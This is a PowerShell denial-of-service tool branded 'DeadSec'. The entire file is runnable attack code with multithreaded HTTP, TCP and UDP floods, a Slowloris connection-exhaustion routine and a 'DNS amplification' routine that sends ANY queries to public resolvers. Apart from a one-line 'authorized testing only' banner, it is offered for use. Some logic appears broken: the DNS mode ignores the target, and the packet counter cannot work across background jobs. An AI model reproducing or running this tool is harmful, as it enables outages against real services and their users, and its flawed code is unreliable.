# DeadSec DDoS Attack Module (PowerShell)
# Multi-vector distributed denial of service attack tool
# ⚠️ FOR AUTHORIZED PENETRATION TESTING ONLY ⚠️

param(
    [Parameter(Mandatory=$true)]
    [string]$Target,
    
    [int]$Port = 80,
    
    [ValidateSet('HTTP','TCP','UDP','Slowloris','DNS')]
    [string]$AttackType = 'HTTP',
    
    [int]$Threads = 50,
    
    [int]$Duration = 60
)

# Global variables
$script:AttackActive = $true
$script:PacketsSent = 0
$script:Lock = New-Object System.Object

function Write-Log {
    param([string]$Message)
    $timestamp = Get-Date -Format "HH:mm:ss"
    Write-Host "[$timestamp] [DEADSEC] $Message" -ForegroundColor Red
}

function Increment-Counter {
    [System.Threading.Monitor]::Enter($script:Lock)
    try {
        $script:PacketsSent++
    }
    finally {
        [System.Threading.Monitor]::Exit($script:Lock)
    }
}

function Start-HTTPFlood {
    param(
        [string]$TargetUrl,
        [int]$DurationSeconds,
        [int]$ThreadId
    )
    
    $endTime = (Get-Date).AddSeconds($DurationSeconds)
    
    $userAgents = @(
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
    )
    
    while ($script:AttackActive -and (Get-Date) -lt $endTime) {
        try {
            $randomParam = Get-Random -Minimum 1 -Maximum 999999
            $url = "$TargetUrl?rand=$randomParam"
            
            $request = [System.Net.WebRequest]::Create($url)
            $request.Method = "GET"
            $request.UserAgent = $userAgents | Get-Random
            $request.Timeout = 3000
            $request.KeepAlive = $true
            
            $response = $request.GetResponse()
            $response.Close()
            
            Increment-Counter
        }
        catch {
            # Silent fail, continue attacking
        }
    }
}

function Start-TCPFlood {
    param(
        [string]$TargetIP,
        [int]$TargetPort,
        [int]$DurationSeconds,
        [int]$ThreadId
    )
    
    $endTime = (Get-Date).AddSeconds($DurationSeconds)
    
    while ($script:AttackActive -and (Get-Date) -lt $endTime) {
        try {
            $client = New-Object System.Net.Sockets.TcpClient
            $client.Connect($TargetIP, $TargetPort)
            
            $stream = $client.GetStream()
            $data = [byte[]]::new(1024)
            $stream.Write($data, 0, $data.Length)
            
            $stream.Close()
            $client.Close()
            
            Increment-Counter
        }
        catch {
            # Silent fail
        }
    }
}

function Start-UDPFlood {
    param(
        [string]$TargetIP,
        [int]$TargetPort,
        [int]$DurationSeconds,
        [int]$ThreadId
    )
    
    $endTime = (Get-Date).AddSeconds($DurationSeconds)
    
    $client = New-Object System.Net.Sockets.UdpClient
    $payload = New-Object byte[] 1024
    (New-Object Random).NextBytes($payload)
    
    while ($script:AttackActive -and (Get-Date) -lt $endTime) {
        try {
            $client.Send($payload, $payload.Length, $TargetIP, $TargetPort) | Out-Null
            Increment-Counter
        }
        catch {
            # Silent fail
        }
    }
    
    $client.Close()
}

function Start-SlowlorisAttack {
    param(
        [string]$TargetIP,
        [int]$TargetPort,
        [int]$DurationSeconds,
        [int]$ThreadId
    )
    
    $endTime = (Get-Date).AddSeconds($DurationSeconds)
    $sockets = @()
    
    try {
        # Create multiple connections
        for ($i = 0; $i -lt 50; $i++) {
            try {
                $socket = New-Object System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,
                                                                [System.Net.Sockets.SocketType]::Stream,
                                                                [System.Net.Sockets.ProtocolType]::Tcp)
                $socket.Connect($TargetIP, $TargetPort)
                
                # Send partial HTTP headers
                $header = "GET / HTTP/1.1`r`nHost: $TargetIP`r`nUser-Agent: Mozilla/5.0`r`n"
                $socket.Send([System.Text.Encoding]::ASCII.GetBytes($header)) | Out-Null
                
                $sockets += $socket
                Increment-Counter
            }
            catch {
                # Silent fail
            }
        }
        
        # Keep connections alive
        while ($script:AttackActive -and (Get-Date) -lt $endTime) {
            foreach ($socket in $sockets) {
                try {
                    $socket.Send([System.Text.Encoding]::ASCII.GetBytes("X-a: b`r`n")) | Out-Null
                    Increment-Counter
                }
                catch {
                    # Connection lost
                }
            }
            Start-Sleep -Seconds 10
        }
    }
    finally {
        foreach ($socket in $sockets) {
            try { $socket.Close() } catch {}
        }
    }
}

function Start-DNSAmplification {
    param(
        [string]$TargetIP,
        [int]$DurationSeconds,
        [int]$ThreadId
    )
    
    $endTime = (Get-Date).AddSeconds($DurationSeconds)
    
    $dnsServers = @('8.8.8.8', '8.8.4.4', '1.1.1.1', '1.0.0.1')
    
    $client = New-Object System.Net.Sockets.UdpClient
    
    # DNS query for ANY record
    $dnsQuery = [byte[]](0xaa,0xaa,0x01,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,
                         0x03,0x77,0x77,0x77,0x06,0x67,0x6f,0x6f,0x67,0x6c,0x65,
                         0x03,0x63,0x6f,0x6d,0x00,0x00,0xff,0x00,0x01)
    
    while ($script:AttackActive -and (Get-Date) -lt $endTime) {
        foreach ($dnsServer in $dnsServers) {
            try {
                $client.Send($dnsQuery, $dnsQuery.Length, $dnsServer, 53) | Out-Null
                Increment-Counter
            }
            catch {
                # Silent fail
            }
        }
    }
    
    $client.Close()
}

function Start-StatusMonitor {
    param([int]$DurationSeconds)
    
    $startTime = Get-Date
    
    while ($script:AttackActive -and ((Get-Date) - $startTime).TotalSeconds -lt $DurationSeconds) {
        $elapsed = [int]((Get-Date) - $startTime).TotalSeconds
        $rate = if ($elapsed -gt 0) { $script:PacketsSent / $elapsed } else { 0 }
        $remaining = $DurationSeconds - $elapsed
        
        Write-Log "⚡ Attack Status: $($script:PacketsSent) packets sent | $($rate.ToString('F2')) pps | ${remaining}s remaining"
        Start-Sleep -Seconds 5
    }
}

function Start-DDoSAttack {
    Write-Log "=" * 70
    Write-Log "💀 DEADSEC DDoS ATTACK INITIATED 💀"
    Write-Log "=" * 70
    Write-Log "Target: $Target"
    Write-Log "Port: $Port"
    Write-Log "Attack Type: $($AttackType.ToUpper())"
    Write-Log "Threads: $Threads"
    Write-Log "Duration: $Duration seconds"
    Write-Log "=" * 70
    
    $script:AttackActive = $true
    $script:PacketsSent = 0
    
    # Resolve domain to IP if needed
    $targetIP = $Target
    if ($AttackType -ne 'HTTP') {
        try {
            $targetIP = [System.Net.Dns]::GetHostAddresses($Target)[0].IPAddressToString
            Write-Log "Resolved $Target -> $targetIP"
        }
        catch {
            Write-Log "Failed to resolve $Target : $_"
            return
        }
    }
    
    # Start status monitor
    $monitorJob = Start-Job -ScriptBlock ${function:Start-StatusMonitor} -ArgumentList $Duration
    
    # Launch attack threads
    $jobs = @()
    
    for ($i = 0; $i -lt $Threads; $i++) {
        $job = switch ($AttackType) {
            'HTTP' {
                Start-Job -ScriptBlock ${function:Start-HTTPFlood} -ArgumentList $Target, $Duration, $i
            }
            'TCP' {
                Start-Job -ScriptBlock ${function:Start-TCPFlood} -ArgumentList $targetIP, $Port, $Duration, $i
            }
            'UDP' {
                Start-Job -ScriptBlock ${function:Start-UDPFlood} -ArgumentList $targetIP, $Port, $Duration, $i
            }
            'Slowloris' {
                Start-Job -ScriptBlock ${function:Start-SlowlorisAttack} -ArgumentList $targetIP, $Port, $Duration, $i
            }
            'DNS' {
                Start-Job -ScriptBlock ${function:Start-DNSAmplification} -ArgumentList $targetIP, $Duration, $i
            }
        }
        
        $jobs += $job
    }
    
    Write-Log "✓ Launched $($jobs.Count) attack threads"
    
    # Wait for completion
    Start-Sleep -Seconds $Duration
    $script:AttackActive = $false
    
    # Wait for jobs to finish
    Write-Log "Waiting for attack threads to complete..."
    $jobs | Wait-Job -Timeout 10 | Out-Null
    $jobs | Remove-Job -Force
    
    if ($monitorJob) {
        Stop-Job $monitorJob -ErrorAction SilentlyContinue
        Remove-Job $monitorJob -Force
    }
    
    Write-Log "=" * 70
    Write-Log "💀 ATTACK COMPLETE 💀"
    Write-Log "Total packets sent: $($script:PacketsSent)"
    Write-Log "Average rate: $(($script:PacketsSent / $Duration).ToString('F2')) packets/second"
    Write-Log "=" * 70
}

# Main execution
try {
    Start-DDoSAttack
}
catch {
    Write-Log "⚠️ Attack error: $_"
}
finally {
    $script:AttackActive = $false
}
